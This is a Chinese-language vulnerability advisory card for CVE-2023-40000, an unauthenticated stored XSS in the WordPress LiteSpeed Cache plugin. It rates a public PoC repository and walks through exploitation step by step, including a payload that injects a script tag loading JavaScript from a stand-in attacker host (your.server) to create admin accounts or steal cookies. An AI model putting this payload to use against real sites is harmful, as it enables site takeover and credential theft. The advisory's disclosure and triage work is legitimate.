## CVE-2023-40000-LiteSpeed Cache-Stored XSS

**漏洞编号:** CVE-2023-40000

**漏洞类型:** Stored XSS

**影响应用:** LiteSpeed Cache

**危害等级:** 高危，可能导致权限提升和敏感信息泄露

**影响版本:** <= 5.7

**利用条件:** 目标网站安装了LiteSpeed Cache插件且版本低于或等于5.7，攻击者无需认证即可利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于LiteSpeed Cache插件的`update_cdn_status`函数中。由于该函数未对输入进行充分的过滤，攻击者可以通过发送包含恶意JavaScript代码的POST请求，将XSS payload存储在服务器上。当管理员访问WordPress后台时，恶意代码会被执行，从而实现权限提升等攻击。

**有效性：**

提供的PoC代码是有效的，它通过模拟发送带有恶意脚本的POST请求，利用`update_cdn_status`函数中的漏洞，实现存储型XSS。

**投毒风险：**

PoC仓库中可能存在投毒代码的风险较低（10%）。PoC的主要功能是演示漏洞利用，但恶意作者可能会在PoC中添加额外的代码，例如收集用户信息、植入后门等。代码的readme部分以及license是比较标准的, 只是单纯的demo. 但仍需要审查 `admin-bar-reloaded.min.js` 中的js代码。

**利用方式：**

1.  攻击者构造包含恶意JavaScript代码的POST请求。
2.  将`success`参数设置为`0`，`result[_msg]`参数设置为包含`<script src=https://your.server/admin-bar-reloaded.min.js></script>`的payload，其中`https://your.server/admin-bar-reloaded.min.js`指向攻击者控制的服务器上的恶意脚本。
3.  通过cURL等工具将POST请求发送到目标网站的`/wp-json/litespeed/v1/cdn_status`端点。
4.  当管理员访问WordPress后台时，存储的XSS payload会被触发，执行恶意JavaScript代码。
5.  恶意代码可以创建新的管理员账号，或者执行其他恶意操作，例如窃取Cookie、修改网站内容等。

**项目地址:** [quantiom/litespeed-cache-xss-poc](https://github.com/quantiom/litespeed-cache-xss-poc)

**漏洞详情:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)